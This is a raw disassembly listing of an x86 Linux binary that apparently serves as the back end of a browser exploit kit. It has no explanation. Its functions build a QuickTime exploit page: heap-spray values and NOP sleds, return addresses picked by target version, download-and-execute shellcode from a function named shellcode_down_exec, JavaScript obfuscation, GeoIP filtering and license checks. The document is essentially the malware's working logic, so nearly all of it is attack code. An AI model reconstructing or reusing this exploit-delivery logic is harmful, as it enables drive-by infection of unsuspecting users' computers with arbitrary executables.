sub    esp,0xc
call   804907c <frame_dummy>
call   804de90 <__do_global_ctors_aux>
add    esp,0xc
ret    
push   DWORD PTR ds:0x8055830
jmp    DWORD PTR ds:0x8055834
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x8055838
push   0x0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x805583c
push   0x8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055840
push   0x10
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055844
push   0x18
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055848
push   0x20
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x805584c
push   0x28
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055850
push   0x30
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055854
push   0x38
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055858
push   0x40
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x805585c
push   0x48
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055860
push   0x50
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055864
push   0x58
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055868
push   0x60
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x805586c
push   0x68
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055870
push   0x70
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055874
push   0x78
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055878
push   0x80
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x805587c
push   0x88
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055880
push   0x90
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055884
push   0x98
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055888
push   0xa0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x805588c
push   0xa8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055890
push   0xb0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055894
push   0xb8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055898
push   0xc0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x805589c
push   0xc8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558a0
push   0xd0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558a4
push   0xd8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558a8
push   0xe0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558ac
push   0xe8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558b0
push   0xf0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558b4
push   0xf8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558b8
push   0x100
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558bc
push   0x108
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558c0
push   0x110
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558c4
push   0x118
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558c8
push   0x120
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558cc
push   0x128
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558d0
push   0x130
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558d4
push   0x138
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558d8
push   0x140
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558dc
push   0x148
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558e0
push   0x150
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558e4
push   0x158
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558e8
push   0x160
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558ec
push   0x168
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558f0
push   0x170
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558f4
push   0x178
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558f8
push   0x180
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x80558fc
push   0x188
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055900
push   0x190
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055904
push   0x198
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055908
push   0x1a0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x805590c
push   0x1a8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055910
push   0x1b0
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055914
push   0x1b8
jmp    8048bfc <.plt>
jmp    DWORD PTR ds:0x8055918
push   0x1c0
jmp    8048bfc <.plt>
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
and    esp,0xfffffff0
mov    ebx,DWORD PTR [ebp+0x4]
mov    edi,edx
lea    esi,[ebp+ebx*4+0xc]
test   ebx,ebx
mov    DWORD PTR ds:0x8055e60,esi
jle    8048fdf <_start+0x43>
mov    eax,DWORD PTR [ebp+0x8]
test   eax,eax
je     8048fdf <_start+0x43>
mov    ds:0x8050320,eax
mov    ecx,eax
mov    al,BYTE PTR [ecx]
test   al,al
je     8048fdf <_start+0x43>
nop
cmp    al,0x2f
lea    edx,[ecx+0x1]
je     804901c <_start+0x80>
mov    ecx,edx
mov    al,BYTE PTR [ecx]
test   al,al
jne    8048fd0 <_start+0x34>
mov    eax,0x8055760
test   eax,eax
je     8049026 <_start+0x8a>
sub    esp,0xc
push   edi
call   8048eec <atexit@plt>
add    esp,0x10
sub    esp,0xc
push   0x804deb4
call   8048eec <atexit@plt>
call   8048be8 <_init>
push   eax
push   esi
lea    eax,[ebp+0x8]
push   eax
push   ebx
call   804977c <main>
add    esp,0x14
push   eax
call   8048f1c <exit@plt>
nop
mov    ecx,edx
mov    DWORD PTR ds:0x8050320,edx
jmp    8048fd9 <_start+0x3d>
call   8048e6c <_init_tls@plt>
jmp    8048ff4 <_start+0x58>
nop
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
cmp    BYTE PTR ds:0x805592c,0x0
je     804904e <__do_global_dtors_aux+0x1e>
jmp    8049079 <__do_global_dtors_aux+0x49>
lea    esi,[esi+0x0]
add    eax,0x4
mov    ds:0x8050328,eax
call   edx
mov    eax,ds:0x8050328
mov    edx,DWORD PTR [eax]
test   edx,edx
jne    8049044 <__do_global_dtors_aux+0x14>
mov    eax,0x0
test   eax,eax
je     8049072 <__do_global_dtors_aux+0x42>
sub    esp,0xc
push   0x805575c
call   0 <_init-0x8048be8>
add    esp,0x10
mov    BYTE PTR ds:0x805592c,0x1
leave  
ret    
nop
push   ebp
mov    eax,0x0
mov    ebp,esp
sub    esp,0x8
test   eax,eax
je     80490a0 <frame_dummy+0x24>
sub    esp,0x8
push   0x8055930
push   0x805575c
call   0 <_init-0x8048be8>
add    esp,0x10
mov    eax,ds:0x8055828
test   eax,eax
je     80490c4 <frame_dummy+0x48>
mov    eax,0x0
test   eax,eax
je     80490c4 <frame_dummy+0x48>
sub    esp,0xc
push   0x8055828
call   0 <_init-0x8048be8>
add    esp,0x10
mov    esi,esi
leave  
ret    
nop
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x2a74
mov    edi,DWORD PTR [ebp+0x10]
push   edi
push   0x804ed8a
mov    esi,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x2a68],0x0
mov    DWORD PTR [ebp-0x2a64],0x0
mov    DWORD PTR [ebp-0x2a5c],0x0
mov    DWORD PTR [ebp-0x2a6c],0x804e06c
call   804d62c <ntoa>
add    esp,0xc
push   0x2a40
push   0x90
mov    ebx,eax
lea    eax,[ebp-0x2a58]
push   eax
call   8048e5c <memset@plt>
mov    dl,BYTE PTR [esi+0x1]
lea    eax,[edx-0x1]
add    esp,0x10
cmp    al,0x1
ja     8049192 <exp_quicktime_insert+0xca>
mov    DWORD PTR [ebp-0x2a64],0xc0c0c0c
mov    eax,DWORD PTR [ebp+0x14]
test   eax,eax
jne    8049238 <exp_quicktime_insert+0x170>
mov    ebx,DWORD PTR [ebp-0x2a64]
test   ebx,ebx
jne    80493b1 <exp_quicktime_insert+0x2e9>
push   DWORD PTR ds:0x8055920
push   0x5
push   0x1
push   0x804df69
call   8048f0c <fwrite@plt>
mov    eax,DWORD PTR [ebp-0x2a68]
add    esp,0x10
test   eax,eax
je     804918a <exp_quicktime_insert+0xc2>
sub    esp,0xc
push   DWORD PTR [ebp-0x2a68]
call   8048f8c <free@plt>
add    esp,0x10
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    eax,[edx-0x3]
cmp    al,0x1
ja     804913f <exp_quicktime_insert+0x77>
cmp    BYTE PTR [esi],0x6
jne    804913f <exp_quicktime_insert+0x77>
push   edi
push   DWORD PTR [ebp+0xc]
push   0x6
push   esi
push   0x40000000
movzx  eax,BYTE PTR ds:0x8055950
push   eax
lea    eax,[ebp-0x2a5c]
push   eax
push   0x8054fc0
mov    DWORD PTR [ebp-0x2a5c],0xca
call   804d194 <shellcode_down_exec>
add    esp,0x1c
push   DWORD PTR [ebp-0x2a5c]
mov    DWORD PTR [ebp-0x2a68],eax
push   DWORD PTR [ebp-0x2a68]
lea    eax,[ebp-0x2990]
push   eax
call   8048ccc <memcpy@plt>
mov    al,BYTE PTR [ebx]
add    esp,0x10
cmp    al,0x36
jne    8049203 <exp_quicktime_insert+0x13b>
mov    DWORD PTR [ebp-0x2a64],0x66802a9e
mov    al,BYTE PTR [ebx]
cmp    al,0x37
jne    804913f <exp_quicktime_insert+0x77>
cmp    BYTE PTR [ebx+0x1],0x30
je     80495c8 <exp_quicktime_insert+0x500>
cmp    BYTE PTR [ebx+0x1],0x31
jg     804913f <exp_quicktime_insert+0x77>
cmp    BYTE PTR [ebx+0x2],0x33
jg     804913f <exp_quicktime_insert+0x77>
mov    DWORD PTR [ebp-0x2a64],0x668013c2
jmp    804913f <exp_quicktime_insert+0x77>
cmp    BYTE PTR [esi+0x1],0x2
je     804941d <exp_quicktime_insert+0x355>
mov    ecx,DWORD PTR [ebp-0x2a64]
test   ecx,ecx
jne    804942e <exp_quicktime_insert+0x366>
sub    esp,0x8
push   0x0
push   0x804df6f
call   804d228 <print_headers>
pop    eax
pop    edx
push   0xa000
push   0xa
call   804d8b0 <strrand>
add    esp,0xc
push   eax
push   0x804df7f
push   0x804e06c
call   804d754 <strreplace>
pop    ecx
mov    ebx,eax
pop    eax
push   0xa000
push   0x17
call   804d8b0 <strrand>
add    esp,0xc
push   eax
push   0x804df86
push   ebx
call   804d754 <strreplace>
add    esp,0x10
test   ebx,ebx
mov    DWORD PTR [ebp-0x2a6c],eax
je     80492b8 <exp_quicktime_insert+0x1f0>
sub    esp,0xc
push   ebx
call   8048f8c <free@plt>
add    esp,0x10
push   0x8055949
push   0x837f9d
push   0x33f
push   0x80508e0
call   804d534 <decode_data>
push   edi
push   DWORD PTR [ebp+0xc]
push   0x4
push   esi
call   804d120 <create_exec_url>
add    esp,0x1c
push   eax
push   0x804df8e
push   0x80508e0
mov    edi,eax
call   804d754 <strreplace>
mov    esi,eax
pop    eax
pop    edx
push   0x4000
push   0x6
call   804d8b0 <strrand>
add    esp,0xc
push   eax
push   0x804df9f
push   esi
call   804d754 <strreplace>
add    esp,0x10
test   esi,esi
mov    ebx,eax
je     8049326 <exp_quicktime_insert+0x25e>
sub    esp,0xc
push   esi
call   8048f8c <free@plt>
add    esp,0x10
test   edi,edi
mov    esi,ebx
je     8049338 <exp_quicktime_insert+0x270>
sub    esp,0xc
push   edi
call   8048f8c <free@plt>
add    esp,0x10
push   edi
push   ebx
push   0x804dfab
push   DWORD PTR [ebp-0x2a6c]
call   804d754 <strreplace>
mov    ebx,eax
push   DWORD PTR ds:0x8055920
xor    eax,eax
cld    
mov    ecx,0xffffffff
mov    edi,ebx
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
push   ecx
push   0x1
push   ebx
call   8048f0c <fwrite@plt>
mov    ecx,DWORD PTR [ebp-0x2a6c]
add    esp,0x20
test   ecx,ecx
je     8049388 <exp_quicktime_insert+0x2c0>
sub    esp,0xc
push   DWORD PTR [ebp-0x2a6c]
call   8048f8c <free@plt>
add    esp,0x10
test   esi,esi
je     8049398 <exp_quicktime_insert+0x2d0>
sub    esp,0xc
push   esi
call   8048f8c <free@plt>
add    esp,0x10
test   ebx,ebx
je     8049158 <exp_quicktime_insert+0x90>
sub    esp,0xc
push   ebx
call   8048f8c <free@plt>
add    esp,0x10
jmp    8049158 <exp_quicktime_insert+0x90>
sub    esp,0x8
push   0x0
push   0x804df6f
call   804d228 <print_headers>
mov    eax,DWORD PTR [ebp-0x2a64]
push   DWORD PTR ds:0x8055920
mov    DWORD PTR [ebp-0x20],eax
mov    DWORD PTR [ebp-0x1c],eax
cld    
mov    BYTE PTR [ebp-0x348],0x3a
xor    eax,eax
mov    edi,DWORD PTR [ebp-0x2a6c]
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
push   ecx
push   0x1
push   0x804e06c
call   8048f0c <fwrite@plt>
add    esp,0x20
push   DWORD PTR ds:0x8055920
push   0x2a40
push   0x1
lea    eax,[ebp-0x2a58]
push   eax
call   8048f0c <fwrite@plt>
add    esp,0x10
jmp    8049158 <exp_quicktime_insert+0x90>
cmp    WORD PTR [esi+0x2],0x7d6
jbe    8049250 <exp_quicktime_insert+0x188>
jmp    8049242 <exp_quicktime_insert+0x17a>
sub    esp,0x8
push   0x0
push   0x804df6f
mov    BYTE PTR [ebp-0x2a5d],0x90
call   804d228 <print_headers>
pop    eax
pop    edx
push   0xa000
push   0xa
call   804d8b0 <strrand>
add    esp,0xc
push   eax
push   0x804df7f
push   0x804e06c
call   804d754 <strreplace>
pop    esi
pop    edi
push   0xa000
push   0xa
mov    ebx,eax
call   804d8b0 <strrand>
add    esp,0xc
push   eax
push   0x804dfab
push   ebx
call   804d754 <strreplace>
add    esp,0x10
test   ebx,ebx
mov    DWORD PTR [ebp-0x2a6c],eax
je     804949d <exp_quicktime_insert+0x3d5>
sub    esp,0xc
push   ebx
call   8048f8c <free@plt>
add    esp,0x10
sub    esp,0x8
push   DWORD PTR [ebp-0x2a6c]
push   DWORD PTR ds:0x8055920
call   8048d7c <fprintf@plt>
mov    ecx,DWORD PTR [ebp-0x2a68]
add    esp,0x10
test   ecx,ecx
je     8049598 <exp_quicktime_insert+0x4d0>
lea    edi,[ebp-0x2a5d]
mov    ebx,0xc7
lea    esi,[esi+0x0]
push   DWORD PTR ds:0x8055920
push   0x1
push   0x1
push   edi
call   8048f0c <fwrite@plt>
add    esp,0x10
dec    ebx
jns    80494d0 <exp_quicktime_insert+0x408>
push   DWORD PTR ds:0x8055920
push   DWORD PTR [ebp-0x2a5c]
push   0x1
push   DWORD PTR [ebp-0x2a68]
call   8048f0c <fwrite@plt>
mov    ebx,0x3
add    esp,0x10
push   DWORD PTR ds:0x8055920
push   0x1
push   0x1
push   edi
call   8048f0c <fwrite@plt>
add    esp,0x10
dec    ebx
jns    8049507 <exp_quicktime_insert+0x43f>
sub    esp,0x8
push   DWORD PTR ds:0x8055920
push   0x3a
call   8048efc <fputc@plt>
mov    ebx,0x326
add    esp,0x10
lea    esi,[esi+0x0]
push   DWORD PTR ds:0x8055920
push   0x1
push   0x1
push   edi
call   8048f0c <fwrite@plt>
add    esp,0x10
dec    ebx
jns    8049538 <exp_quicktime_insert+0x470>
push   DWORD PTR ds:0x8055920
push   0x1
push   0x4
lea    ebx,[ebp-0x2a64]
push   ebx
call   8048f0c <fwrite@plt>
push   DWORD PTR ds:0x8055920
push   0x1
push   0x4
push   ebx
call   8048f0c <fwrite@plt>
mov    edx,DWORD PTR [ebp-0x2a6c]
add    esp,0x20
test   edx,edx
je     8049158 <exp_quicktime_insert+0x90>
sub    esp,0xc
push   DWORD PTR [ebp-0x2a6c]
call   8048f8c <free@plt>
jmp    80493a9 <exp_quicktime_insert+0x2e1>
push   DWORD PTR ds:0x8055920
push   0x8
push   0x1
sub    esp,0xc
push   0xa000
push   0xa
call   804d8b0 <strrand>
add    esp,0x14
push   eax
call   8048f0c <fwrite@plt>
lea    edi,[ebp-0x2a5d]
add    esp,0x10
jmp    804951d <exp_quicktime_insert+0x455>
mov    al,BYTE PTR [ebx+0x2]
sub    eax,0x32
cmp    al,0x1
ja     8049215 <exp_quicktime_insert+0x14d>
mov    DWORD PTR [ebp-0x2a64],0x66801382
jmp    804913f <exp_quicktime_insert+0x77>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   esi
push   ebx
sub    esp,0x8
push   DWORD PTR [ebp+0x10]
push   0x804dfb3
call   804d62c <ntoa>
add    esp,0xc
push   eax
push   0x804dfb6
push   DWORD PTR [ebp+0x8]
call   804d754 <strreplace>
mov    ebx,eax
pop    eax
pop    edx
push   DWORD PTR [ebp+0xc]
push   0x804dfb3
call   804d62c <ntoa>
add    esp,0xc
push   eax
push   0x804dfc2
push   ebx
call   804d754 <strreplace>
add    esp,0x10
test   ebx,ebx
mov    esi,eax
je     8049643 <replace_env+0x5b>
sub    esp,0xc
push   ebx
call   8048f8c <free@plt>
add    esp,0x10
push   eax
mov    eax,DWORD PTR [ebp+0x14]
test   eax,eax
je     8049678 <replace_env+0x90>
push   eax
push   0x804dfcb
push   esi
call   804d754 <strreplace>
add    esp,0x10
test   esi,esi
mov    ebx,eax
je     804966c <replace_env+0x84>
sub    esp,0xc
push   esi
call   8048f8c <free@plt>
add    esp,0x10
lea    esp,[ebp-0x8]
mov    eax,ebx
pop    ebx
pop    esi
leave  
ret    
lea    esi,[esi+0x0]
mov    eax,0x804e01f
jmp    804964b <replace_env+0x63>
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x3c
mov    ecx,DWORD PTR [ebp+0x10]
xor    ebx,ebx
test   ecx,ecx
je     80496a3 <client_check_data+0x23>
mov    edi,DWORD PTR [ebp+0x10]
cld    
mov    ecx,0xffffffff
xor    eax,eax
repnz scas al,BYTE PTR es:[edi]
mov    ebx,ecx
not    ebx
sub    esp,0xc
push   0x8
call   804d878 <xmalloc>
mov    DWORD PTR [eax],0x0
mov    DWORD PTR [eax+0x4],0x0
mov    esi,eax
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x20],eax
lea    eax,[ebx+0x20]
mov    DWORD PTR [ebp-0x1c],eax
lea    eax,[ebp-0x38]
mov    WORD PTR [ebp-0x38],0x2
mov    DWORD PTR [esp],eax
call   804a18c <client_send_request>
add    esp,0x10
test   eax,eax
je     804970c <client_check_data+0x8c>
sub    esp,0x8
push   0x20
push   DWORD PTR [ebp+0xc]
call   804a12c <client_send_data>
add    esp,0x10
test   eax,eax
je     804970c <client_check_data+0x8c>
test   ebx,ebx
je     8049728 <client_check_data+0xa8>
sub    esp,0x8
push   ebx
push   DWORD PTR [ebp+0x10]
call   804a12c <client_send_data>
add    esp,0x10
test   eax,eax
jne    8049728 <client_check_data+0xa8>
nop
sub    esp,0xc
push   esi
call   8048f8c <free@plt>
add    esp,0x10
call   804a2d4 <client_close>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
nop
sub    esp,0xc
lea    eax,[ebp-0x3c]
push   eax
call   804a204 <client_recv_reply>
add    esp,0x10
test   eax,eax
mov    edi,eax
je     8049747 <client_check_data+0xc7>
mov    al,BYTE PTR [eax]
mov    BYTE PTR [esi],al
cmp    DWORD PTR [ebp-0x3c],0x1
ja     8049766 <client_check_data+0xe6>
call   804a2d4 <client_close>
test   edi,edi
je     804975c <client_check_data+0xdc>
sub    esp,0xc
push   edi
call   8048f8c <free@plt>
add    esp,0x10
lea    esp,[ebp-0xc]
pop    ebx
mov    eax,esi
pop    esi
pop    edi
leave  
ret    
sub    esp,0xc
lea    eax,[edi+0x1]
push   eax
call   804d700 <xstrdup>
add    esp,0x10
mov    DWORD PTR [esi+0x4],eax
jmp    8049747 <client_check_data+0xc7>
mov    esi,esi
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x5c
and    esp,0xfffffff0
sub    esp,0x18
xor    esi,esi
cmp    DWORD PTR [ebp+0x8],0x1
mov    eax,DWORD PTR [ebp+0xc]
jg     8049798 <main+0x1c>
xor    eax,eax
push   eax
push   0x8055fa0
call   804a36c <env_init>
mov    edi,DWORD PTR ds:0x8055fa8
add    esp,0x10
test   edi,edi
jne    80497c8 <main+0x4c>
sub    esp,0xc
push   0x804e118
call   8048cdc <puts@plt>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
nop
push   DWORD PTR ds:0x8055fd8
push   DWORD PTR ds:0x8055fb0
push   DWORD PTR ds:0x8055fb4
push   0x8055e80
call   804abf0 <form_parse>
lea    edi,[ebp-0x38]
add    esp,0xc
xor    eax,eax
cld    
mov    ecx,0x8
rep stos DWORD PTR es:[edi],eax
push   0x804dfd8
push   0x8055fa0
push   0x8055ea0
call   804be04 <license_load>
add    esp,0x10
test   eax,eax
jne    8049828 <main+0xac>
sub    esp,0xc
push   0x804dfe6
call   8048cdc <puts@plt>
mov    DWORD PTR [esp],0x804df4c
jmp    80497b8 <main+0x3c>
lea    esi,[esi+0x0]
sub    esp,0xc
push   0x0
call   8048ebc <GeoIP_new@plt>
add    esp,0x10
test   eax,eax
mov    ebx,eax
je     8049857 <main+0xdb>
sub    esp,0x8
push   DWORD PTR ds:0x8055fc0
push   eax
call   8048f3c <GeoIP_country_id_by_addr@plt>
mov    esi,eax
mov    DWORD PTR [esp],ebx
call   8048cbc <GeoIP_delete@plt>
add    esp,0x10
mov    edx,DWORD PTR ds:0x8055fb0
test   edx,edx
je     804997c <main+0x200>
mov    al,BYTE PTR [edx]
cmp    al,0x70
je     804997c <main+0x200>
cmp    al,0x75
je     8049b6c <main+0x3f0>
cmp    al,0x6c
je     8049b04 <main+0x388>
cmp    al,0x6f
jne    80497bd <main+0x41>
sub    esp,0x8
push   0x804dfff
push   0x8055e80
call   804aae4 <form_get_value>
add    esp,0x10
test   eax,eax
mov    edx,eax
mov    DWORD PTR [ebp-0x4c],0x0
mov    DWORD PTR [ebp-0x50],0x0
je     80498c3 <main+0x147>
push   eax
lea    eax,[ebp-0x4c]
push   eax
push   0x804dfb3
push   edx
call   8048e1c <sscanf@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp-0x4c]
test   eax,eax
je     80497bd <main+0x41>
sub    esp,0xc
push   DWORD PTR ds:0x8055fc0
call   8048cac <__inet_addr@plt>
add    esp,0xc
push   0x0
lea    edx,[ebp-0x38]
push   edx
mov    DWORD PTR [ebp-0x38],eax
push   0x40000000
mov    eax,DWORD PTR [ebp-0x4c]
mov    DWORD PTR [ebp-0x2c],eax
call   8049680 <client_check_data>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x54],eax
je     80497bd <main+0x41>
mov    eax,ds:0x8055fb0
sub    esp,0xc
inc    eax
push   eax
call   8048c8c <atol@plt>
pop    edi
mov    ebx,eax
pop    eax
push   0x804e001
push   0x8055e80
call   804aae4 <form_get_value>
add    esp,0x10
test   eax,eax
mov    edx,eax
je     8049944 <main+0x1c8>
lea    eax,[ebp-0x50]
push   esi
push   eax
push   0x804dfb3
push   edx
call   8048e1c <sscanf@plt>
add    esp,0x10
cmp    ebx,0x6
jne    80497bd <main+0x41>
mov    edx,DWORD PTR [ebp-0x54]
xor    eax,eax
test   BYTE PTR [edx],0x20
jne    8049963 <main+0x1e7>
mov    ebx,DWORD PTR ds:0x8055fd4
test   ebx,ebx
je     8049963 <main+0x1e7>
mov    al,0x1
push   eax
push   DWORD PTR [ebp-0x50]
push   DWORD PTR [ebp-0x4c]
push   0x8055fa0
call   80490c8 <exp_quicktime_insert>
add    esp,0x10
jmp    80497bd <main+0x41>
sub    esp,0xc
push   DWORD PTR ds:0x8055fc0
mov    al,ds:0x8055fa1
mov    BYTE PTR [ebp-0x33],al
call   8048cac <__inet_addr@plt>
mov    DWORD PTR [ebp-0x38],eax
mov    eax,esi
mov    BYTE PTR [ebp-0x1c],al
mov    al,ds:0x8055fa0
mov    DWORD PTR [esp],0x0
mov    BYTE PTR [ebp-0x34],al
call   8048eac <time@plt>
pop    ecx
pop    ebx
push   0x0
sub    esp,0xc
push   0x804dfff
mov    DWORD PTR [ebp-0x20],eax
push   0x8055e80
mov    ax,ds:0x8055fa2
mov    WORD PTR [ebp-0x32],ax
call   804aae4 <form_get_value>
add    esp,0x14
push   eax
call   804a318 <Crc32Str>
add    esp,0xc
push   DWORD PTR ds:0x8055fd4
lea    edx,[ebp-0x38]
push   edx
mov    DWORD PTR [ebp-0x2c],eax
push   0x80008000
mov    eax,ds:0x8055fa4
mov    DWORD PTR [ebp-0x24],eax
call   8049680 <client_check_data>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x54],eax
je     80497bd <main+0x41>
mov    dl,BYTE PTR [eax]
movsx  eax,dl
test   al,0x20
je     8049ae6 <main+0x36a>
test   al,0x8
jne    8049ae6 <main+0x36a>
mov    al,ds:0x8055fa0
test   al,al
je     8049ae6 <main+0x36a>
cmp    al,0x7
ja     8049ae6 <main+0x36a>
mov    al,ds:0x8055fa1
cmp    al,0x1
je     8049d18 <main+0x59c>
cmp    al,0x2
je     8049def <main+0x673>
sub    eax,0x3
cmp    al,0x1
ja     8049ae6 <main+0x36a>
push   0x805594c
push   0xbced7
push   0x361
push   0x8051920
call   804d534 <decode_data>
mov    eax,DWORD PTR [ebp-0x54]
push   DWORD PTR [eax+0x4]
push   DWORD PTR [ebp-0x24]
push   DWORD PTR [ebp-0x2c]
push   0x8051920
call   80495e8 <replace_env>
add    esp,0x20
cmp    BYTE PTR ds:0x8055fa1,0x3
mov    ebx,eax
je     8049f3e <main+0x7c2>
push   ecx
push   0x804eef9
push   0x804e003
push   ebx
call   804d754 <strreplace>
mov    ebx,eax
pop    eax
pop    edx
push   0x1
push   ebx
call   804bd34 <js_crypter_print>
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
add    esp,0x10
mov    edx,DWORD PTR [ebp-0x54]
mov    eax,DWORD PTR [edx+0x4]
test   eax,eax
je     80497bd <main+0x41>
sub    esp,0xc
push   eax
call   8048f8c <free@plt>
mov    eax,DWORD PTR [ebp-0x54]
add    esp,0x10
mov    DWORD PTR [eax+0x4],0x0
jmp    80497bd <main+0x41>
mov    edx,DWORD PTR [ebp-0x54]
mov    eax,DWORD PTR [edx+0x4]
test   eax,eax
je     80497bd <main+0x41>
sub    esp,0x8
push   eax
push   0x804e011
call   8048c2c <printf@plt>
jmp    8049aba <main+0x33e>
cmp    BYTE PTR [edx+0x1],0x3d
jne    80497bd <main+0x41>
sub    esp,0x8
push   0x0
lea    eax,[edx+0x2]
push   eax
call   804a318 <Crc32Str>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x2c],eax
je     80497bd <main+0x41>
sub    esp,0xc
push   DWORD PTR ds:0x8055fc0
call   8048cac <__inet_addr@plt>
mov    DWORD PTR [ebp-0x38],eax
mov    DWORD PTR [esp],0x0
call   8048eac <time@plt>
add    esp,0xc
push   0x0
mov    DWORD PTR [ebp-0x20],eax
lea    eax,[ebp-0x38]
push   eax
mov    edx,esi
push   0x20008000
mov    BYTE PTR [ebp-0x1c],dl
call   8049680 <client_check_data>
add    esp,0x10
jmp    80497bd <main+0x41>
mov    esi,esi
sub    esp,0x8
lea    eax,[ebp-0x2c]
push   eax
lea    eax,[ebp-0x24]
push   eax
lea    eax,[ebp-0x44]
push   eax
lea    eax,[ebp-0x30]
push   eax
lea    eax,[ebp-0x1b]
push   eax
lea    eax,[ebp-0x32]
push   eax
lea    eax,[ebp-0x33]
push   eax
lea    eax,[ebp-0x34]
push   eax
push   0x804e140
lea    eax,[edx+0x1]
push   eax
call   8048e1c <sscanf@plt>
add    esp,0x24
push   DWORD PTR ds:0x8055fc0
call   8048cac <__inet_addr@plt>
mov    edx,esi
mov    DWORD PTR [esp],0x0
mov    DWORD PTR [ebp-0x38],eax
mov    BYTE PTR [ebp-0x1c],dl
call   8048eac <time@plt>
mov    DWORD PTR [ebp-0x20],eax
mov    al,BYTE PTR [ebp-0x33]
dec    eax
add    esp,0x10
cmp    al,0x3
ja     80497bd <main+0x41>
mov    al,BYTE PTR [ebp-0x34]
test   al,al
je     80497bd <main+0x41>
cmp    al,0x7
ja     80497bd <main+0x41>
sub    esp,0xc
push   DWORD PTR ds:0x8055fc0
call   804d0fc <get_ip_hash>
add    esp,0x10
cmp    eax,DWORD PTR [ebp-0x44]
jne    80497bd <main+0x41>
push   eax
push   0x0
lea    eax,[ebp-0x38]
push   eax
push   0x40008000
call   8049680 <client_check_data>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x54],eax
je     80497bd <main+0x41>
test   BYTE PTR [eax],0x20
je     804a018 <main+0x89c>
sub    esp,0x8
push   0x0
push   0x0
call   804d228 <print_headers>
mov    edx,DWORD PTR [ebp-0x54]
xor    edi,edi
add    esp,0x10
test   BYTE PTR [edx],0x40
je     804a082 <main+0x906>
mov    edi,DWORD PTR [edx+0x4]
cld    
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
sub    esp,0xc
add    ecx,0x3ff
push   ecx
call   804d878 <xmalloc>
mov    edi,eax
